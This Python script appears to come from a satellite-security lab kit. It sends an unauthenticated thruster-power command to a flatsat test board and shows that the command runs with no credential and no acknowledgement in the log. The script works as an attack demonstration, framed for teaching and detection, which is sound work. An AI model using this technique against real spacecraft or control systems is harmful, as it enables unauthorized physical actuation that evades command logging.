#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 02_command_injection_usb.py -- move something physical through a command
# path that never asks who you are.
#
# SET_THRUSTER (0x04) takes two octets, thruster id and raw power, and the
# firmware clamps neither. An attacker does not need the command you
# protected. They need the one you forgot.
#
# The second half of the problem is the silence: SET_THRUSTER sends no
# acknowledgement, so the ground has no record it happened. The only evidence
# is the state change itself, on the next telemetry poll, if anyone compares.
#
# Expected: the thruster value changes on the board's console and on the
# PWNSAT-C3 gauge, with nothing in the command log to match it.

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat import FlatSat, TC_SET_THRUSTER, TC_GET_STATUS  # noqa: E402


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default=None)
    ap.add_argument("--thruster-id", type=int, choices=[0, 1], default=0)
    ap.add_argument("--power", type=int, default=200, metavar="0-255")
    ap.add_argument("--seq", type=int, default=1)
    ap.add_argument("--restore", action="store_true", help="set the power back to zero")
    ap.add_argument("--cleartext", action="store_true")
    args = ap.parse_args()
    if not 0 <= args.power <= 255:
        ap.error("--power must be 0-255")

    with FlatSat(port=args.port, encrypt=not args.cleartext) as fsat:
        print("\n=== 1. state before ===")
        fsat.send(TC_GET_STATUS, b"", seq=args.seq, listen=1.2)

        print(f"\n=== 2. thruster {args.thruster_id} to {args.power}, no credential ===")
        fsat.send(TC_SET_THRUSTER, bytes([args.thruster_id & 0xFF, args.power & 0xFF]),
                  seq=args.seq + 1, listen=1.0)
        print("[*] Note what did NOT come back: SET_THRUSTER acknowledges nothing.")

        print("\n=== 3. state after ===")
        fsat.send(TC_GET_STATUS, b"", seq=args.seq + 2, listen=1.2)

        if args.restore:
            print("\n=== 4. putting it back ===")
            fsat.send(TC_SET_THRUSTER, bytes([args.thruster_id & 0xFF, 0]),
                      seq=args.seq + 3, listen=1.0)

    print("\nWatch the telemetry panel, not the console's own log. The gap "
          "between them is the finding.")
    print("\nWhat the sensor should have shown: a critical command that executed "
          "with the secure link off.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
